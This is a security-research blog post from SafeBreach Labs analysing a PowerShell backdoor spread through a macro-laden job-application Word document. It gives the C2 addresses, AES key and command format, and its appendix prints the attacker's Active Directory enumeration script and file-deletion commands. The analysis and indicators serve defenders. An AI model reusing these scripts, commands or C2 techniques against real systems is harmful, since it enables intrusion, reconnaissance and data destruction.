@@ -1,0 +1,222 @@
+1/12
+www.safebreach.com
+/resources/blog/safebreach-labs-researchers-uncover-new-fully-undetectable-powershell-backdoor/
+SafeBreach Labs Researchers Uncover New Fully Undetectable
+Powershell Backdoor
+Author: 
+Tomer Bar, Director of Security Research, SafeBreach
+As part of our ongoing commitment to conducting original research to uncover new threats and ensure
+our Hacker’s Playbook provides the most comprehensive collection of attacks, the SafeBreach Labs
+research team recently discovered a new fully undetectable (FUD) powershell backdoor that leverages a
+novel approach of disguising itself as part of the Windows update process. The covert self-developed tool
+and the associated C2 commands seem to be the work of a sophisticated, unknown threat actor who has
+targeted approximately 100 victims. 
+In this research report, we will provide a high-level overview of this FUD powershell backdoor, including
+when it first appeared and what it does. We’ll also provide insight into the operations security mistakes
+made by the threat actor responsible for the tool that we were able to logically exploit to access and
+decrypt the encrypted C2 commands for each victim. One of the commands is an execution of a full
+powershell code for Active Directory users enumeration and remote desktop enumeration, which
+probably will be used later in a lateral movement phase. Finally, we’ll share details about how SafeBreach
+is sharing this information with the security community. 
+Initial Access
+2/12
+The attack starts with a malicious Word document, which includes a macro code that launches an
+unknown powershell script. The name of the Word document is “Apply Form.docm.” The malicious Word
+document was uploaded from Jordan on August 25, 2022. 
+Figure 1: Upload of the malicious document to VirusTotal
+Figure 2: Content of Apply Form.docm
+The metadata of the file reveals this campaign was related to an alleged LinkedIn-based job application
+spearphishing lure.
+3/12
+Figure 3: Document properties of Apply Form.docm
+The Macro drops updater.vbs, creates a scheduled task pretending to be part of a Windows update,
+which will execute the updater.vbs script from a fake update folder under
+“%appdata%\local\Microsoft\Windows.
+Figure 4: Registration of the new schedule task
+Figure 5: The scheduled task xml file
+The updater.vbs script executes a powershell script.
+4/12
+Figure 6: Powershell script 
+Before executing the scheduled task, it will create two powershell scripts, named Script.ps1 and
+Temp.ps1. The content of the powershell scripts is stored in text boxes inside the Word document and will
+be saved to the same fake update directory of %AppData%\Local\Microsoft\Windows\Update.
+Figure 7: Creation of two powershell scripts
+Both scripts are obfuscated and FUD with 0 detection in VirusTotal.
+Figure 8: VirusTotal listing for each script
+Script1.ps1 connects to the C2 server to get commands to be executed by sending an HTTP GET
+request to hxxp://45.89.125.189/get, which returns the victim’s unique ID. When we first tested it, we got
+ID number 70, which means there were probably 69 victims prior to our test. The script sends a second
+HTTP POST request to the same URL, and the C2 server responds with a command to be executed
+encrypted by AES-256 CBC with the following encryption key:
+“17 1d 84 e8 41 ae e4 c0 ff fb a2 7c 86 d1 ec 82 b8 80 7c b8 c3 79 9a 11 b8 fa 2d b7 78 1f d1 5a”
+And the following IV value: 
+5/12
+“18 3c ed 6f b3 34 9f 9a c6 f9 8 f9 29 de 35 52”
+The response of the C2 server to the POST request is decrypted using CyberChef.
+Figure 9: CyberChef AES decryption of the C2 response content to the POST request
+The command,
+starts with a type number shown here in red. There are 3 possible values—0,1, or 2, which we will
+explain later on. The 0-type value in this case indicates that it is expected to execute the powershell
+command. The blue section is a separator, the green section is the command expression to be executed,
+the brown section is a separator between commands, and the final purple “:” means there are no other
+commands to execute.
+
+The script will parse the commands and will execute the Temp.ps1 script for each command with the
+parameter named c:
+Figure 10: Script1.ps1 executing Temp.ps1 with the command received from the C2 server
+If the command starts with 2, it will save the command received from the C2 response to a file path also
+provided by the C2. Then it will execute Temp.ps1 with a parameter in this formula: 
+6/12
+‘RES!#%’ + %content%lt;command converted to base64>
+The Temp.ps1 script will decode the base64 command and will check the type of command. 
+If the value is 0, it will execute it using invoke-expression, encrypt the output of the command using
+the same encryption key, and upload it using an HTTP POST request to hxxp://45.89.125.189/put.
+If the value is 1, it will read the command to be executed from the path received inside the C2
+response and execute it.
+If the value is 2, it will write the command to be executed to the path and execute the command.
+Here, the threat actor made a crucial operations security mistake by using predictable victims’ IDs. We
+developed a script that pretended to be each victim and recorded the C2 responses (commands) in a
+pcap file, then ran a second tool we developed to extract the encrypted commands from the pcap.
+Figure 11: Our script to collect all C2 commands for all victims 0-101 on 9/2/2022
+Here we can see the output from the script for victim 49. When copied to CyberChef, the decrypted
+command is provided.
+7/12
+Figure 12: Decrypted command for victim 49 in CyberChef
+We ran the command for each victim and found the following percentage of each command type waiting
+for the victims:
+66%: Exfiltrate process list command
+23%: Empty command – Idle (the command starts with “:”)
+7%: Local users enumerations – whoami and whoami /all + process list
+2%: Remove files from public folder + net accounts + computer name, IP configurations …
+1%: List files in special folders – program files, downloads, desktop, documents, appdata
+1%: Entire script for A.D users enumerations and RDP clients enumerations (see Appendix B)
+Below we’ve included some illuminating examples.
+
+Figure 13: Victim 2 – two commands – whoami and dirlist of the system32 folder
+Figure 14: Victim X – multiple commands – whoami /all, curl ident.me will return the external IP address
+of the victim
+Figure 15: Victim Y – entire powershell script to be executed 
+8/12
+The malicious script queries the domain controller for all users and for all administrators. 
+Figure 16: Malicious powershell script sent as a command by the C2 server
+It then checks for login history.
+Figure 17: Malicious powershell script sent as a command by the C2 server continued
+
+And then enumerates terminal servers by the powershell command:
+
+Get-ChildItem “Registry::HKCU\Software\Microsoft\Terminal Server Client\Servers”
+Figure 18: Delete all files under the public user and then collect net accounts
+Conclusion 
+SafeBreach is passionate about improving security on a global level, and as an organization, we are
+committed to openly sharing our research with the broader security community. By sharing information
+specifically about our discovery of this FUD powershell backdoor, our goal is to raise awareness about
+this new, unrecognized type of malware that managed to bypass all the security vendors’ scanners under
+VirusTotal.com. 
+In addition, we believe that the discovery of this operation’s security mistakes made by this threat actor
+may be used by other researchers and blue teams in their future digital forensics and incident response
+9/12
+(DFIR) investigations. Finally, we hope organizations and individuals can use the indicators of
+compromise (IOCs) provided in Appendix A to better detect and protect themselves against this threat. 
+As with any newly identified threat, SafeBreach has added coverage for this FUD powershell backdoor to
+the SafeBreach platform, so customers can immediately simulate this attack, verify whether they are
+adequately protected, and take any necessary remedial action.  
+Appendix A: IOCs
+Below are the associated IOCs.
+C2 server – hxxp://45.89.125.189/put, hxxp://45.89.125.189/get
+
+The C2 server is not active since September 5 2022
+Apply Form.docm -45f293b1b5a4aaec48ac943696302bac9c893867f1fc282e85ed8341dd2f0f50
+
+Updater.vbs 
+54ed729f7c495c7baa7c9e4e63f8cf496a8d8c89fc10da87f2b83d5151520514
+Script.ps1
+bda4484bb6325dfccaa464c2007a8f20130f0cf359a7f79e14feeab3faa62332
+Temp.ps1
+16007ea6ae7ce797451baec2132e30564a29ee0bf8a8f05828ad2289b3690f55
+Appendix B: Powershell Scripts
+Below are the powershell scripts that were sent as a command to the backdoor.
+0!@#EWQ639¦+.x7.function Convert-LDAPProperty {
+    param(
+        [Parameter(Mandatory=$True,ValueFromPipeline=$True)]
+        [ValidateNotNullOrEmpty()]
+        $Properties
+    )
+    $ObjectProperties = @{}
+    $Properties.PropertyNames | ForEach-Object {
+        if (($_ -eq “objectsid”) -or ($_ -eq “sidhistory”)) {
+            # convert the SID to a string
+10/12
+            $ObjectProperties[$_] = (New-Object System.Security.Principal.SecurityIdentifier($Properties[$_]
+[0],0)).Value
+        }
+        elseif($_ -eq “objectguid”) {
+            # convert the GUID to a string
+            $ObjectProperties[$_] = (New-Object Guid (,$Properties[$_][0])).Guid
+        }
+        elseif( ($_ -eq “lastlogon”) -or ($_ -eq “lastlogontimestamp”) -or ($_ -eq “pwdlastset”) -or ($_ -eq
+“lastlogoff”) -or ($_ -eq “badPasswordTime”) ) {
+            # convert timestamps
+            if ($Properties[$_][0] -is [System.MarshalByRefObject]) {
+                # if we have a System.__ComObject
+                $Temp = $Properties[$_][0]
+                [Int32]$High = $Temp.GetType().InvokeMember(“HighPart”,
+[System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
+                [Int32]$Low  = $Temp.GetType().InvokeMember(“LowPart”, 
+[System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
+                $ObjectProperties[$_] = ([datetime]::FromFileTime([Int64](“0x{0:x8}{1:x8}” -f $High, $Low)))
+            }
+            else {
+                $ObjectProperties[$_] = ([datetime]::FromFileTime(($Properties[$_][0])))
+            }
+        }
+        elseif($Properties[$_][0] -is [System.MarshalByRefObject]) {
+            # convert misc com objects
+            $Prop = $Properties[$_]
+            try {
+                $Temp = $Prop[$_][0]
+11/12
+                Write-Verbose $_
+                [Int32]$High = $Temp.GetType().InvokeMember(“HighPart”,
+[System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
+                [Int32]$Low  = $Temp.GetType().InvokeMember(“LowPart”, 
+[System.Reflection.BindingFlags]::GetProperty, $null, $Temp, $null)
+                $ObjectProperties[$_] = [Int64](“0x{0:x8}{1:x8}” -f $High, $Low)
+            }
+            catch {
+                $ObjectProperties[$_] = $Prop[$_]
+            }
+        }
+        elseif($Properties[$_].count -eq 1) {
+            $ObjectProperties[$_] = $Properties[$_][0]
+        }
+        else {
+            $ObjectProperties[$_] = $Properties[$_]
+        }
+    }
+    New-Object -TypeName PSObject -Property $ObjectProperties
+}
+$domainObject = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
+$Domain = $domainObject.name
+$sStr = “LDAP://”
+$DistinguishedName = “DC=$($Domain.Replace(‘.’, ‘,DC=’))”
+$sStr += $DistinguishedName
+$search = New-Object System.DirectoryServices.DirectorySearcher([ADSI]$sStr)
+###to get all users
+#$search.filter=”(&(samAccountType=805306368))”
+12/12
+###
+### to get specific user
+$UserName = “Administrator”
+$search.filter=”(&(samAccountType=805306368)(samAccountName=$UserName))”
+### 
+$search.FindAll() | Where-Object {$_} | ForEach-Object {
+    # convert/process the LDAP fields for each result
+    Convert-LDAPProperty -Properties $_.Properties
+} | out-string^%$RTY0!@#EWQ643!@#EWQGet-ChildItem “Registry::HKCU\Software\Microsoft\Terminal
+Server Client\Servers” | Out-String^%$RTY0!@#EWQ675!@#EWQRemove-Item C:\Users\Public\*.*
+Remove-Item C:\Users\Public\Update_Data
+get-childitem C:\users\public\ | out-string^%$RTY
+Credits & References
+After finishing this research, we found another researcher’s brief summary:
+
+https://twitter.com/StopMalvertisin/status/1562896289981136898
